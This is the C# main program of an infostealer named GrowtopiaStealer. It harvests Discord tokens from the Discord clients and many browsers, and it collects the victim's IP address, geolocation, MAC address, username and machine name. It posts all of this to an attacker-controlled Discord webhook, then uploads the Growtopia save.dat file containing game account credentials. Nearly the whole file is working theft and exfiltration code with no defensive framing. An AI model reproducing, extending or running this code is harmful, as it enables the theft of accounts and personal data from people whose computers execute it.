using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.ComponentModel;
using System.Management;
using System.Net.NetworkInformation;
using System.Text;
using System.IO;
using JNogueira.Discord.Webhook.Client;

namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
{
    static class Program
    {
        /*
        internal class Growtopia
        {
            
            public static string strchange98(string strchange99)
            {
                byte[] array = File.ReadAllBytes(strchange99);
                string @string = Encoding.ASCII.GetString(array);
                //int x = int.Parse(@string.IndexOf("lastworld").ToString());
                string result;
                try
                {
                    //byte[] array = File.ReadAllBytes(strchange99);
                    //string @string = Encoding.ASCII.GetString(array);
                    string text = @string.Substring(@string.IndexOf("tankid_name") + 15, Convert.ToInt32(array[@string.IndexOf("tankid_name") + 11]));
                    /*int i;
                    //x = int.Parse(@string.IndexOf("lastworld").ToString());
                    string text2 = @string.Substring(@string.IndexOf("lastworld") + 13, Convert.ToInt32(array[@string.IndexOf("lastworld") + 25]));
                    string text3 = "";
                    for (i=0;i<text2.Length;i++)
                    {
                        int z;
                        z = text2[i];
                        if (z >= 48 && z <= 122)
                        {
                            text3 = text3 + text2[i];
                        }
                        else
                            break;
                    }*/
        /*result = text;
        //result = result + Environment.NewLine;
        //result = result + "Last world: " + text3.ToUpper();
    }
    catch
    {
        result = "Null";
    }
    return result;
}


    }*/
        public static List<string> goSendTokens = DiscordStealing.AllTokens;
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            #region Stealing discord tokens from apps and browsers.
            Task.WaitAll(
            DiscordStealing.DiscordApp(),
            DiscordStealing.DiscordCanary(),
            DiscordStealing.DiscordPTB(),
            DiscordStealing.Chrome(),
            DiscordStealing.ChromeBeta(),
            DiscordStealing.FireFox(),
            DiscordStealing.Opera(),
            DiscordStealing.OperaGX(),
            DiscordStealing.Edge(),
            DiscordStealing.Yandex(),
            DiscordStealing.Brave(),
            DiscordStealing.EpicPrivacy(),
            DiscordStealing.Vivaldi(),
            DiscordStealing.ThreeHundredSixty(),
            DiscordStealing.CocCoc()
            );
            #endregion

            #region String for send tokens to discord webhook
            string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());
            #endregion

            #region IP, IPv6, Country, City.
            // WebClient
            WebClient Amogus = new WebClient();
            // DNS host name
            String host = System.Net.Dns.GetHostName();
            // IP
            string IP = Amogus.DownloadString("https://ipapi.co/ip/");
            // IPv6
            System.Net.IPAddress IPv6 = Dns.GetHostEntry(host).AddressList[0];
            // Country
            string Country = Amogus.DownloadString("https://ipapi.co/country_name/");
            // City
            string City = Amogus.DownloadString("https://ipapi.co/city/");
            #endregion

            #region MAC Address
            var macAddress = NetworkInterface.GetAllNetworkInterfaces();
            var getTarget = macAddress[0].GetPhysicalAddress();
            #endregion

            #region UserName
            // UserName
            string user = Environment.UserName;
            #endregion

            #region Embed webhook message with "JNogueira.Discord.Webhook.Client".
            // Here discord webhook
            var client = new DiscordWebhookClient(DiscordWebhook.defaultWebhook);
            var message = new DiscordMessage(
                username: "GrowtopiaStealer | TheC0mpany",
                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                tts: false,
                embeds: new[]{
                    new DiscordMessageEmbed(
                        "GrowtopiaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("NEW LOG FROM - " + Environment.MachineName + " " + Environment.UserName),
                        description:
                               "\nIP: " + IP +
                               "\nIPv6: " + IPv6 +
                               "\nCountry: " + Country +
                               "\nCity: " + City +
                               "\n ================================" +
                               "\nMAC Address: " + getTarget +
                               "\n ================================"
                               )
                });
            client.SendToDiscord(message);
            #endregion

            Dictionary<string, string> Token = new Dictionary<string, string>
                    {
                        { "content", "\nTokens:\n" + Tokens},
                        { "avatar_url", DiscordWebhook.defaultAvatar},
                        { "username", DiscordWebhook.defaultUserName}
            };
            HttpClient cl1 = new HttpClient();
            cl1.PostAsync(DiscordWebhook.defaultWebhook, new FormUrlEncodedContent(Token)).GetAwaiter().GetResult();  // FormUrlEncodedContent

            #region Message of save.dat
            string mssgBody =
                               "\n@everyone @here here save.dat, enjoy :)";
            #endregion

            #region Sending save.dat to discord webhook.
            string filename = Environment.MachineName + "." + Environment.UserName + ".dat";
            string fileformat = "dat";
            string filepath = GrowtopiaStealer.Growtopia.savePath;
            string application = "";

            try
            {
                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending log 
            }
            catch
            {
                DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
            }
            #endregion
        }
    }
}